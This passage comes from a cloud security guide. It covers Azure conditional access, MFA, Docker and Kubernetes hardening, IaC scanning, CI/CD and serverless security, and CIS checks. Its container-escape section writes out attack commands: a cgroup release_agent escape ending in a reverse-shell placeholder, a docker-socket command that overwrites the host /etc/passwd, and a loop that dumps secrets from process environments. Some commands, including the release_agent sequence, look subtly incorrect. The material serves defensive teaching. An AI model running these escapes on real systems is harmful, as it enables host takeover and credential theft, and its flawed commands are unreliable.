A **Conditional Access policy** decides *when* and *how* access is allowed based on signals: user risk, device compliance, location, app.

```json
{
  "displayName": "Block unmanaged devices for Finance apps",
  "state": "enabled",
  "conditions": {
    "applications": {
      "includeApplications": [
        "00000000-0000-4000-8000-000000000001"
      ]
    },
    "locations": {
      "includeLocations": ["All"],
      "excludeLocations": ["195.51.100.0/24"]
    },
    "clientAppTypes": ["browser", "mobileAppsAndDesktopClients"],
    "signInRiskLevels": ["high"],
    "userRiskLevels": ["high"]
  },
  "grantControls": {
    "operator": "AND",
    "builtInControls": [
      "block"
    ]
  }
}
```

**Common CA policies:**
1. Require **MFA for all admins** (always).
2. **Block** sign-in from unknown/tor countries.
3. Require **compliant device** for HR/payroll apps.
4. **Session risk-based**: re-auth when user risk is medium/high.
5. Require MFA **re-registration** on password change.

## 6.4 MFA Enforcement

| Provider | Enforcement Point | Policy |
|---|---|---|
| AWS | IAM + SCP + IAM Identity Center | `aws:MultiFactorAuthPresent` condition in policy |
| Azure | Conditional Access | "Require MFA" grant for all users |
| GCP | IAM conditions + org policy | `attributes.mfa` / require 2SV |

**Mock AWS SCP enforcing MFA:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"
        }
      }
    }
  ]
}
```

---

# 7. Container Security

## 7.1 Container Fundamentals

A container is an isolated user-space process sharing the host kernel.

```
┌──────────────────────────────────────────────────┐
│                    HOST KERNEL                    │
├──────────────┬──────────────┬────────────────────┤
│  Container A │  Container B │   Container C      │
│  cgroup      │  cgroup      │   cgroup           │
│  namespace   │  namespace   │   namespace        │
│  image A     │  image B     │   image C          │
└──────────────┴──────────────┴────────────────────┘
```

| Term | Meaning | Security Relevance |
|---|---|---|
| **Image** | Read-only template (filesystem + config) | Source of most container vulns |
| **Layer** | One filesystem diff in an image | Layers cache secrets if baked in |
| **Registry** | Image store (Docker Hub, ECR, GAR, ACR) | Trust boundary; scan on push |
| **Container** | Running instance of an image | Runtime isolation |
| **Runtime** | The thing that runs containers (runC, containerd) | Escape bugs live here |

**The shared kernel is the risk:** one kernel exploit or misconfigured capability can break out of the container.

## 7.2 Docker Security Best Practices

| Control | Setting / Example | Why |
|---|---|---|
| **Image scanning** | `trivy image`, `docker scan`, ECR scanning | Find CVEs before deploy |
| **Least privilege** | `docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE` | Remove unneeded capabilities |
| **Read-only FS** | `--read-only` + tmpfs for /tmp | Prevent malware writing |
| **Non-root user** | `USER appuser` in image | Reduce damage if code compromised |
| **Resource limits** | `--memory=512m --cpus=0.5 --pids-limit=128` | Stop DoS / fork bombs |
| **Seccomp/AppArmor** | `--security-opt seccomp=profile.json` | Limit syscalls a process can make |
| **No privileged** | Never `--privileged` | Full host access = trivial escape |
| **No host mounts** | Avoid `-v /:/host` | Writing to host FS |
| **Non-root runtime** | `dockerd` with rootless mode | Containers run without root daemon |

### 7.2.1 Secure Docker Run Command

```bash
docker run -d \
  --name mock-web \
  --read-only \
  --tmpfs /tmp \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt no-new-privileges \
  --security-opt seccomp=seccomp-default.json \
  --memory=512m \
  --cpus=0.5 \
  --pids-limit=256 \
  --network=web-network \
  --user 10001:10001 \
  mock-web:v1.2.0
```

## 7.3 Dockerfile Hardening — Before/After

### ❌ Insecure Dockerfile (before)

```dockerfile
FROM node:18

# ❌ Runs as root
# ❌ Full base image with dev tooling
# ❌ Copies .env with secrets baked in
COPY package*.json ./
RUN npm install
COPY . .
COPY .env /app/.env

# ❌ Insecure server exposed
EXPOSE 3000
CMD ["npm", "start"]
```

### ✅ Hardened Dockerfile (after)

```dockerfile
# Multi-stage: build with tooling, ship minimal runtime
FROM node:18-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine AS runtime
WORKDIR /app

# Non-root user, created explicitly
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

COPY --from=build /app/node_modules ./node_modules
COPY --chown=appuser:appgroup dist ./dist

# No secrets baked in — inject at runtime
ENV NODE_ENV=production

# Drop capabilities and force no-new-privileges at build time too
USER appuser

EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s CMD wget -qO- http://127.0.0.1:3000/health || exit 1

CMD ["node", "dist/server.js"]
```

**What changed:** root → non-root; single image → multi-stage slim; `.env` removed; pinned `npm ci` for reproducible deps; healthcheck added.

## 7.4 Supply Chain Security

| Control | Tool / Example | Purpose |
|---|---|---|
| **Base image verification** | Use official images + digests, not mutable tags | `FROM node:18-alpine@sha256:abcdef...` |
| **Image signing** | `cosign sign` (Sigstore) | Prove image integrity + origin |
| **SBOM** | `syft generate sbom`, `trivy sbom` | Inventory all components for vuln tracking |
| **Registry policy** | Only allow signed/scanned images to deploy | Admission gate in K8s |
| **Dependency pinning** | Lockfiles + package pinning | Reproducible, less tampering |

```bash
# Generate SBOM
syft scan nginx:1.25-alpine -o spdx-json > nginx.sbom.json

# Sign an image with cosign (Sigstore keyless)
cosign sign ghcr.io/mockcorp/web:v1.2.0

# Verify before pulling in CI
cosign verify --key cosign.pub ghcr.io/mockcorp/web:v1.2.0
```

**Mock SBOM snippet (SPDX):**
```json
{
  "SPDXID": "SPDXRef-DOCUMENT",
  "name": "nginx:1.25-alpine",
  "packages": [
    { "name": "nginx", "versionInfo": "1.25.4", "licenseConcluded": "BSD-2-Clause" },
    { "name": "openssl", "versionInfo": "3.1.4-r0", "licenseConcluded": "Apache-2.0" },
    { "name": "pcre2", "versionInfo": "10.42-r0", "licenseConcluded": "BSD-3-Clause" }
  ]
}
```

---

# 8. Kubernetes Security

## 8.1 Architecture Components

```
                         ┌─────────────────────────────┐
                         │      Control Plane          │
                         │  ┌───────────────────────┐  │
       kubectl ─────────▶│  │ API Server (kube-apiserver)│
                         │  ├───────────────────────┤  │
                         │  │ etcd (cluster state)  │  │
                         │  ├───────────────────────┤  │
                         │  │ Controller Manager    │  │
                         │  ├───────────────────────┤  │
                         │  │ Scheduler             │  │
                         │  └───────────────────────┘  │
                         └────────────┬────────────────┘
                                      │ kubelet communication (TLS)
                                      ▼
                         ┌─────────────────────────────┐
                         │        Worker Node           │
                         │  kubelet ─▶ container runtime│
                         │  kube-proxy ──▶ pods         │
                         └─────────────────────────────┘
```

| Component | Function | Attack Relevance |
|---|---|---|
| **API Server** | All cluster operations go through it | #1 target; must be authenticated + authorized |
| **etcd** | Stores all cluster state & secrets | If exposed → full cluster takeover |
| **kubelet** | Node agent managing pods | Unauthenticated kubelet = remote code execution |
| **Controller Manager / Scheduler** | Reconciliation & placement | Compromise → cluster-wide abuse |
| **kube-proxy** | Network proxying | iptables/ebpf manipulation |
| **CNI plugin** | Pod networking | Network policy enforcement |

## 8.2 Kubernetes Threat Model (MITRE ATT&CK-adjacent)

1. **Initial access:** exposed kubelet/API server, leaked kubeconfig, compromised CI, vulnerable app SSRF.
2. **Execution:** `kubectl exec`, run a malicious pod, use `cronjob`.
3. **Persistence:** backdoor deployment, hostPath mount, DaemonSet.
4. **Lateral movement:** service account token theft, pod-to-pod, cluster-to-cloud (cloud credentials).
5. **Credential access:** secrets in etcd, cloud metadata endpoints, image pull secrets.
6. **Impact:** crypto-mining, data exfiltration, resource exhaustion, cluster deletion.

## 8.3 Kubernetes RBAC (Mock YAML)

RBAC = **Role**/**RoleBinding** (namespaced) or **ClusterRole**/**ClusterRoleBinding** (cluster-wide).

```yaml
# role.yaml — a Role that can only read deployments in namespace "payments"
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: payments
  name: payments-reader
rules:
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "watch"]
---
# rolebinding.yaml — bind it to a service account
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: payments
  name: payments-reader-binding
subjects:
  - kind: ServiceAccount
    name: payment-api
    namespace: payments
roleRef:
  kind: Role
  name: payments-reader
  apiGroup: rbac.authorization.k8s.io
```

**Dangerous permissions to audit:** `*` verbs, `secrets` access, `pods/exec`, `create pods`, `cluster-admin`.

```bash
# Find who can exec into pods (the #1 container-escape enabler)
kubectl auth reconcile --dry-run 2>/dev/null; kubectl get clusterrolebinding,rolebinding -o json \
  | jq '.items[] | select(contains("pods/exec") or contains("pods"))'
```

## 8.4 Service Accounts & Secrets

- **Never run pods with `automountServiceAccountToken: true`** unless needed.
- **Default service account** should have zero privileges.
- Store secrets in **external secret managers** (Vault, cloud KMS) or **Sealed Secrets** instead of etcd-native `Secret` objects.
- Rotate tokens; disable auto-mount:

```yaml
# Disable the automounted default token on a pod
apiVersion: v1
kind: Pod
metadata:
  name: payment-api
spec:
  automountServiceAccountToken: false
  containers:
    - name: app
      image: mockcorp/payment-api:v1.2.0
```

## 8.5 Network Policies (Mock YAML)

Network policies default to **allow-all**; you must define them. A CNI that supports policies is required (Calico, Cilium, Weave).

```yaml
# networkpolicy.yaml — payments pod may only talk to the database
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payments-egress-only-db
  namespace: payments
spec:
  podSelector:
    matchLabels:
      app: payment-api
  policyTypes: ["Ingress", "Egress"]
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: payment-gateway
      ports:
        - protocol: TCP
          port: 8080
  egress:
    - to:
        - podSelector:
            matchLabels:
              app: postgres
      ports:
        - protocol: TCP
          port: 5432
```

**Default-deny fallback policy:**
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: payments
spec:
  podSelector: {}      # applies to all pods in the namespace
  policyTypes: ["Ingress", "Egress"]
```

## 8.6 Pod Security (Pod Security Admission / Standards)

Pod Security Standards (replacing PodSecurityPolicy) provide three levels:

| Level | Restrictions |
|---|---|
| **Privileged** | No restrictions |
| **Baseline** | No privileged containers, no hostNetwork/hostPID/hostIPC, no hostPath, restrict capabilities, `seccompProfile` set |
| **Restricted** | Baseline + **must run as non-root**, read-only root FS, drop `ALL` capabilities, `runAsNonRoot` enforced, `runAsUser` explicit |

**Apply via namespace label:**
```bash
kubectl label ns payments pod-security.kubernetes.io/enforce=restricted
kubectl label ns payments pod-security.kubernetes.io/audit=restricted
kubectl label ns payments pod-security.kubernetes.io/warn=restricted
```

**Pod Security Standards enforcement mock:**
```
Warning: would violate PodSecurity "restricted": 
  securityContext.runAsNonRoot != true
  securityContext.capabilities.drop does not include ALL
  securityContext.seccompProfile is not unconfined
Error from server: admission webhook "pod-security.admission.kubernetes.io" denied the request...
```

## 8.7 Admission Controllers

Admission controllers **inspect and mutate requests before objects are persisted**:

- **PodSecurity** (PSA) — enforce pod security standards.
- **OPA Gatekeeper / Kyverno** — custom policies (e.g., "no latest tags", "no hostPath", "require labels").
- **ValidatingWebhookConfiguration** — your own webhooks.

**Example Kyverno policy (no `latest` tag):**
```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-image-tag
spec:
  validationFailureAction: enforce
  rules:
    - name: no-latest-tag
      match:
        resources:
          kinds: ["Pod"]
      validate:
        message: "Using 'latest' tag is prohibited. Pin an immutable version."
        pattern:
          spec:
            containers:
              - image: "!*:latest"
```

## 8.8 Kubelet Security

- **Kubelet anonymous auth must be disabled:** `--anonymous-auth=false`.
- **Read-only port `10255` must be off.** 
- **Protect kubelet certificates** and use `--rotate-server-certificates`.
- **Block cloud metadata access** from pods (via network policy / IMDS blocking) to prevent credential theft.

## 8.9 Common Kubernetes Attacks

| Attack | How It Works | Mitigation |
|---|---|---|
| **Kubelet anonymous RCE** | kubelet bound to 0.0.0.0 with anonymous auth → `curl https://node:10250/run/...` | `--anonymous-auth=false`, restrict ports, network policies |
| **etcd exposure** | etcd on 2379 without TLS/auth → read all secrets | TLS client certs, firewall etcd to API server only |
| **RBAC abuse** | Over-broad role allows `pods/exec` or secret read | Least-privilege RBAC, audit with `kubectl auth can-i` |
| **Container escape** | Privileged container / hostPath / capability abuse | Restricted PSA, drop caps, no privileged |
| **Service account token theft** | SSRF reads `/var/run/secrets/kubernetes.io/serviceaccount/token` | Disable auto-mount, restrict RBAC, network policy |
| **Supply chain** | Malicious image pulled from registry | Signing (cosign), registry scanning, admission allowlist |
| **Crypto-mining** | Compromised pod runs miners | Resource limits, scans, Falco runtime alerts |

## 8.10 Kubernetes Hardening Checklist

- [ ] **API server:** TLS on all components; disable anonymous auth; RBAC enabled; `--authorization-mode=RBAC,Node`.
- [ ] **etcd:** TLS + client cert auth; accessible only from API server; encrypted storage.
- [ ] **RBAC:** least privilege; no `cluster-admin` for apps; audit `pods/exec` and `secrets`.
- [ ] **Network policies:** default-deny everywhere; allow only needed flows.
- [ ] **Pod Security:** enforce `restricted` namespace-wide.
- [ ] **Service accounts:** no auto-mount; per-app dedicated SAs with minimal roles.
- [ ] **Secrets:** external secrets manager; no secrets in images or env.
- [ ] **Node security:** kubelet anonymous-auth off; upgrade cluster (patch CVEs).
- [ ] **Runtime detection:** Falco/cloud-native observability for anomalous syscalls.
- [ ] **Registry trust:** only signed + scanned images; admission allowlist.
- [ ] **Update & audit:** `kubectl audit log` enabled and shipped to SIEM.

## 8.11 kubectl Examples with Mock Output

```bash
# List pods (mock output)
kubectl get pods -n payments
```
```
NAME                            READY   STATUS    RESTARTS   AGE
payment-api-7d9f8c5b6f-abc12    1/1     Running   0          3h
postgres-0                      1/1     Running   0          12d
redis-6b7d4c84f5-xyz78          1/1     Running   0          9d
```

```bash
# Check who can create pods (mock authorization check)
kubectl auth can-i create pods --as system:serviceaccount:payments:payment-api
```
```
yes
```

```bash
# Inspect a pod's capabilities (mock)
kubectl get pod payment-api-7d9f8c5b6f-abc12 -n payments -o jsonpath='{.spec.securityContext}'
```
```json
{"runAsNonRoot": true, "seccompProfile": {"type": "RuntimeDefault"}, "capabilities": {"drop": ["ALL"]}}
```

```bash
# Audit events for suspicious pods
kubectl get events -A --sort-by=.lastTimestamp | tail -20
```

---

# 9. Container Escape Techniques

> **Educational purpose only.** These techniques are documented so defenders can recognize and block them. Never use against systems you do not own.

## 9.1 The Escape Mindset

Containers share the host kernel. Escape = crossing from "container namespace" to "host namespace" or reaching the host filesystem/device tree. Root inside a container **is not** root on the host — but privileged configurations erase that boundary.

## 9.2 Technique 1 — Privileged Container

**How it works:** `--privileged` grants the container all capabilities, disables seccomp, and mounts `/sys`, `/proc` writable. From there an attacker can `mkdir /sys/fs/cgroup` escape (see 9.4) or write to `/sys/kernel` to alter host behavior.

```bash
# Detecting a privileged container
kubectl get pods -A -o json | jq -r '.items[] | 
  select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

**Mitigations:** never run privileged; enforce PSA `restricted`/`baseline`; audit with admission controllers; runtime detection (Falco) for `mount`, `unshare`, `capsh` syscalls.

## 9.3 Technique 2 — Capabilities Abuse

**How it works:** capabilities like `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_DAC_OVERRIDE`, `CAP_NET_ADMIN` grant host-level power:

- `CAP_SYS_PTRACE` → `ptrace` a host process → write memory / exec.
- `CAP_SYS_ADMIN` → mount filesystems, access host devices.
- `CAP_NET_ADMIN` → alter host network config, sniff traffic.

```bash
# Check capabilities in a running container (as root inside)
capsh --print
```
```
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_sys_admin,
          cap_sys_ptrace,cap_net_admin,cap_setuid,cap_syslog,cap_mknod+eip
```

**Mitigations:** `--cap-drop=ALL --cap-add=NET_BIND_SERVICE`; drop `CAP_SYS_ADMIN` always; seccomp profile restricting `ptrace`, `mount`, `unshare`, `keyctl`.

## 9.4 Technique 3 — cgroup release_agent Escape

**How it works** (classic, on hosts with cgroup v1 and writable cgroup mounts — i.e., privileged containers):

1. Create a cgroup: `mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp`.
2. Enable `notify_on_release`, write host PID to `cgroup.procs`.
3. Set `release_agent` to a shell script path on the **host** filesystem.
4. When the cgroup is emptied, the host kernel runs `release_agent` → **root code execution on the host**.

```bash
# High-level (illustrative) sequence an attacker would attempt
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_pid=$(grep /release_agent /proc/self/cgroup | cut -d: -f3)
echo $host_pid > /tmp/cgrp/release_agent
printf '#!/bin/sh\nreverse_shell_to_c2\n' > /host-root/tmp/x
echo /tmp/x > /tmp/cgrp/release_agent
echo 1 > /tmp/cgrp/cgroup.procs
```

**Mitigations:** never privileged; read-only `/sys`/cgroup mounts; cgroup v2; **seccomp blocking `mount`**; Falco rule alerting on `release_agent` writes.

## 9.5 Technique 4 — Docker Socket Mount

**How it works:** mounting `/var/run/docker.sock` into a container gives the container full control of the Docker daemon → `docker run -v /:/host` → write a cron job / SSH key / binary on the host → root.

```bash
# Attacker in container with docker.sock:
docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host alpine \
  sh -c 'echo "root:hash" > /host/etc/passwd; chroot /host /bin/sh'
```

**Mitigations:** never mount the docker socket; mount via socket proxy (e.g., `docker-socket-proxy`) with ACLs; restrict who can mount volumes via admission policy (Kyverno rule blocking `hostPath: /var/run/docker.sock`).

## 9.6 Technique 5 — hostPID / hostNetwork / hostIPC

- **hostPID:** container sees all host processes → can read `/proc/<pid>/environ`, ptrace them, kill them.
- **hostNetwork:** container shares the host network stack → can sniff traffic, bind privileged ports, reach internal services.
- **hostIPC:** shares host IPC namespaces → read shared memory / semaphores of other tenants.

```bash
# With hostPID, the attacker can dump host process env secrets:
for p in /proc/[0-9]*/environ; do strings "$p" 2>/dev/null | grep -i 'token\|secret'; done
```

**Mitigations:** block `hostPID/hostNetwork/hostIPC` via PSA; only trusted system pods may opt out; runtime detection for `/proc/1` reads.

## 9.7 Escape Mitigation Summary Table

| Technique | Primary Mitigation | Detection Signal |
|---|---|---|
| Privileged container | No `--privileged`; PSA restricted | `securityContext.privileged: true` |
| Capability abuse | Drop all caps; seccomp | `CAP_SYS_ADMIN` present |
| cgroup release_agent | Read-only cgroup; cgroup v2; no mount | Write to `release_agent` |
| Docker socket | Never mount the socket | HostPath to `/var/run/docker.sock` |
| hostPID/Network/IPC | PSA blocks these fields | `hostPID: true` etc. |
| Kernel exploit | Patch kernel; secure container runtime (gVisor/Kata) | Exploit attempt logs, crash |

---

# 10. Infrastructure as Code Security

## 10.1 Why IaC Needs Security

IaC turns cloud setup into code, which means **misconfigurations are now committed, reviewed, and replicated** — good for reproducibility, dangerous if policies are weak. Every cloud breach rooted in "open bucket" started as a line in a Terraform or CloudFormation file.

## 10.2 Terraform Security

### 10.2.1 State File Protection

- The **`.tfstate`** file contains *plaintext secrets* (connection strings, keys, passwords, plan outputs).
- **Never commit it.** Use **remote state** with backend encryption:

```hcl
terraform {
  backend "s3" {
    bucket         = "mock-terraform-state"
    key            = "prod/network/terraform.tfstate"
    region         = "eu-west-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"   # state locking
    kms_key_id     = "arn:aws:kms:eu-west-1:123456789012:key/mock-tf-key"
  }
}
```

- Restrict who can read/write state with **bucket policy + IAM role**.
- Enable **state versioning** and **access logging**.

### 10.2.2 Plan Review in CI

```bash
# In CI (GitLab CI example, mock)
plan:
  stage: validate
  script:
    - terraform init -backend-config=backend.tfvars
    - terraform validate
    - terraform plan -out=plan.tfplan
    - tfsec .                     # static scan
    - checkov -d .                # policy scan
  rules:
    - if: $CI_MERGE_REQUEST_IID
```

### 10.2.3 Mock Unsafe Terraform → Safe Terraform

**Unsafe:**
```hcl
resource "aws_s3_bucket" "data" {
  bucket = "mock-customer-data"
  acl    = "public-read"      # ❌ world-readable
}

resource "aws_iam_policy" "admin" {
  policy = <<EOF
  { "Statement": [{ "Effect": "Allow", "Action": "*", "Resource": "*" }] }
  EOF
}
```

**Safe:**
```hcl
resource "aws_s3_bucket" "data" {
  bucket = "mock-customer-data"

  # ✅ block public access explicitly
  grant {
    type        = "CanonicalUser"
    permission  = "FULL_CONTROL"
    id          = data.aws_canonical_user_id.current.id
  }
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "data" {
  bucket = aws_s3_bucket.data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_iam_policy" "least" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:GetObject"]
      Resource = ["${aws_s3_bucket.data.arn}/prefix/*"]
    }]
  })
}
```

## 10.3 IaC Scanning Tools

### 10.3.1 tfsec — Mock Findings

```bash
tfsec .
```
```
Results:
WARNING: [aws-s3-enable-bucket-encryption] Bucket does not have encryption enabled
  main.tf:4-7
  Info: S3 Buckets should be encrypted at rest to prevent data leakage.
  See https://aquasecurity.github.io/tfsec/...

CRITICAL: [aws-s3-block-public-acls] Bucket has public access explicitly set to public-read
  main.tf:3
  Info: Block public access should be enabled on S3 buckets to prevent accidental exposure.
```

### 10.3.2 Checkov — Mock Findings

```bash
checkov -d .
```
```
Check: CKV_AWS_18: "Ensure the S3 bucket has access logging enabled"
      FAILED for resource: aws_s3_bucket.mock_customer_data
      File: /main.tf:4-7
Check: CKV_AWS_115: "Ensure that AWS Lambda function is configured for function-level concurrent execution limit"
      PASSED for resource: aws_lambda_function.mock_fn
      File: /lambda.tf:1-9
Check: CKV_AWS_272: "Ensure that AWS CodeBuild project does not encrypt artifacts with AWS managed keys"
      FAILED for resource: aws_codebuild_project.mock_build
      File: /codebuild.tf:1-12
```

### 10.3.3 Other Tools

| Tool | Purpose |
|---|---|
| **Checkov** | Policy-as-code scanning (Terraform, CFN, K8s, Dockerfile) |
| **tfsec** | Terraform static analysis |
| **KICS** | Multi-format IaC scanner |
| **kubeconform / kubeval** | Kubernetes manifest validation |
| **Snyk IaC / Bridgecrew** | Commercial unified scanning |
| **Trivy** | Container + IaC + SBOM scanner |

## 10.4 Drift Detection

**Drift** = live cloud state no longer matches declared IaC. A drift could be a benign manual change or an attacker's foothold.

```bash
# Detect drift
terraform plan -detailed-exitcode
echo "Exit code: $?"   # 0 = no drift, 2 = drift detected

# Checkov / Driftctl can also flag it
driftctl scan --from tfstate+s3://mock-terraform-state --to aws+tf
```
**Mock driftctl output:**
```
DRIFT SUMMARY
AWS::S3::Bucket    1 resource(s) changed
AWS::IAM::Policy   2 resource(s) changed
AWS::EC2::SecurityGroup   1 resource(s) changed  ← an unplanned inbound rule!
```

**Response playbook for drift:** triage, block, revert, investigate root cause (was it an attacker or a rogue admin?).

## 10.5 Secrets in IaC

- **Never** put `password = "P@ssw0rd"` in `.tf` files or variables.
- Use **secrets managers** via data sources at apply time:

```hcl
data "aws_secretsmanager_secret_version" "db" {
  secret_id = "mock/db/credentials"
}

locals {
  db_password = jsondecode(data.aws_secretsmanager_secret_version.db.secret_string).password
}
```

- **Scan repos** with `gitleaks` / `trufflehog` to catch committed secrets:

```bash
gitleaks detect --source . --report-path gitleaks-report.json --report-format json
```
```
Finding: AWS Access Key (AKIA...)
File:    modules/db/main.tf:22
Commit:  a1b2c3d4
```

---

# 11. DevSecOps Pipeline Security

## 11.1 CI/CD Threat Model

The pipeline is the **highest-value target** in modern orgs: it holds secrets, builds artifacts, and can deploy to production. Compromise the pipeline → compromise everything downstream.

| Attack Vector | Example | Impact |
|---|---|---|
| **Supply chain (dependencies)** | Malicious package in `npm install` / PyPI | Code execution in build |
| **Secret theft** | Attacker reads pipeline env vars | Deploy credentials stolen |
| **Pull request poisoning** | Malicious code in a PR merged by review bypass | Malware in artifact |
| **Self-hosted runner compromise** | Unpinned `docker` image on runner | Runner = host RCE |
| **Artifact tampering** | Unsigned image overwritten in registry | Bad image deployed |
| **Branch protection bypass** | Force-push / admin merge | Untrusted code shipped |

## 11.2 Signing Artifacts

**Provenance + integrity:** sign everything that ships, and *verify* before deploy.

| Layer | Tool |
|---|---|
| Container images | **cosign** (Sigstore) |
| Binary artifacts | `cosign sign-blob` or GPG/signing keys |
| Software attestation | **in-toto / SLSA** provenance |
| Git commits | GPG or SSH-signed commits |

```bash
# Sign an image in CI
cosign sign --key env://COSIGN_PRIVATE_KEY ghcr.io/mockcorp/app:v1.2.0

# Verify at deploy time (admission gate / pipeline gate)
cosign verify --key cosign.pub ghcr.io/mockcorp/app:v1.2.0
```

## 11.3 Artifact Scanning in the Pipeline

**Scan on every build, block on critical/high:**

```yaml
# GitLab CI example (mock)
scan:
  stage: test
  script:
    - trivy image --exit-code 1 --severity CRITICAL,HIGH \
        ghcr.io/mockcorp/app:v1.2.0
    - gitleaks detect --source . --exit-code 1
    - npm audit --omit=dev --audit-level=high || true
  only:
    - main
```

**Mock scan result blocking the pipeline:**
```
scanner: Trivy
target: ghcr.io/mockcorp/app:v1.2.0
Total: 3 CRITICAL, 4 HIGH, 12 MEDIUM
CRITICAL: CVE-2026-12345 openssl 3.0.12 (RCE)
Blocking deployment...
```

## 11.4 Secrets Management in Pipelines

| Bad Practice | Good Practice |
|---|---|
| Secrets in `.gitlab-ci.yml` / `.github/workflows` | External vault: `vault kv get`, AWS Secrets Manager, Azure Key Vault |
| Long-lived deploy keys in one place | Short-lived OIDC/Workload identity tokens |
| `echo $TOKEN` in logs | `set +x` / masked variables |
| Broad service account in CI | Minimal-scoped per-pipeline identity |
| Secrets in base images | Inject at runtime from the secret store |

```bash
# GitHub Actions — use OIDC, don't store AWS keys
permissions:
  id-token: write
steps:
  - name: Configure AWS creds
    uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gh-actions-deploy
      aws-region: eu-west-1
```

## 11.5 DevSecOps Gate Checklist

- [ ] **SAST** on every commit (Semgrep, CodeQL, SonarQube).
- [ ] **SCA** on every dependency change (Dependabot, Snyk).
- [ ] **Container scan** on every image build (Trivy, Grype).
- [ ] **IaC scan** (Checkov/tfsec) before any apply.
- [ ] **Secret scan** (gitleaks) pre-commit + CI.
- [ ] **Artifact signing + verification** before deploy.
- [ ] **Approval gates** for prod; branch protection on main.
- [ ] **Immutable, pinned** runner images and tool versions.

---

# 12. Serverless Security

## 12.1 Serverless Model & Shared Responsibility

In serverless (AWS Lambda, Azure Functions, GCP Cloud Functions), the provider manages **everything except your code, config, and data policies**. You cannot patch — but you also lose control of runtime details. Security shifts to:

1. **Function code** (injection, deserialization, auth bugs).
2. **IAM/roles attached to the function** (over-permissioned roles).
3. **Event sources** (anyone who can invoke → who controls input).
4. **Dependencies** (unpinned, vulnerable libraries).
5. **Secrets** (env vars, encrypted but visible to code).

## 12.2 Over-Permissioned Roles (Top Risk)

The classic serverless blunder: attach `AdministratorAccess` to a Lambda "because it's easier." If an attacker achieves code execution via the function, they inherit the role's power.

**Minimal function role example:**
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "dynamodb:GetItem",
        "dynamodb:Query"
      ],
      "Resource": "arn:aws:dynamodb:eu-west-1:123456789012:table/orders"
    },
    {
      "Effect": "Allow",
      "Action": [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ],
      "Resource": "*"
    }
  ]
}
```

## 12.3 Event Injection

Serverless input = attacker-controlled input. Attack classes:

| Vector | Example | Defense |
|---|---|---|
| **Event injection** | JSON from an API Gateway event triggers eval-like behavior | Validate schema, allowlist |
| **Zip-slip / archive bombs** | Unzipping a malicious S3 object in the handler | Size/count limits, safe extraction |
| **Path traversal** | Object key used to build a file path | Never build paths from input |
| **Timeout/DoL** | Recursive invocation causes runaway spend | Reserved concurrency + budget alerts |
| **Log forging** | Newlines injected into `console.log` | Structured logging, sanitize input |

**Sample event (mock):**
```json
{
  "resource": "/orders/{id}",
  "httpMethod": "GET",
  "path": "/orders/../../etc/passwd",
  "requestContext": { "identity": { "sourceIp": "198.51.100.7" } }
}
```

## 12.4 Function Code Security

- **Never log secrets or full requests.**
- **Decrypt env vars with KMS inside the handler; don't store plaintext.**
- **Pin dependencies; scan with SCA.**
- **Use runtime updates** — reprovision functions after provider security patches.
- **Configure reserved concurrency** to cap blast radius.

```bash
# Configure reserved concurrency and ephemeral storage limits (mock)
aws lambda update-function-configuration \
  --function-name mock-order-processor \
  --reserved-concurrent-executions 5 \
  --memory-size 256 \
  --ephemeral-storage '{"Size": 512}'
```

## 12.5 Serverless Hardening Checklist

- [ ] Least-privilege IAM role per function; no `*` actions on data.
- [ ] No secrets in env vars unless KMS-encrypted and accessed minimally.
- [ ] Validate/allowlist every event field before processing.
- [ ] SCA + container scanning (for Lambda container images).
- [ ] Enable X-Ray / tracing + structured logs to SIEM.
- [ ] Concurrency caps + spending budgets + anomaly alerts.
- [ ] Separate functions per permission domain (no shared mega-role).
- [ ] Review function triggers: who/what can invoke, and via which principal.

---

# 13. Cloud Compliance & Monitoring

## 13.1 CIS Benchmarks

The **Center for Internet Security** publishes hardening benchmarks for AWS, Azure, GCP, Docker, Kubernetes, and more. Scoring is binary per item:

**Mock CIS AWS 3.0 excerpt:**

| Section | Check | Scoring | Mock Result |
|---|---|---|---|
| 1.1 | Avoid the use of the "root" account | Scored | ✅ PASS |
| 2.1.1 | Ensure S3 buckets are not publicly accessible | Scored | ❌ FAIL (2 buckets) |
| 3.1 | Ensure a log metric filter and alarm exist for unauthorized API calls | Scored | ❌ FAIL |
| 4.1 | Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 | Scored | ✅ PASS |
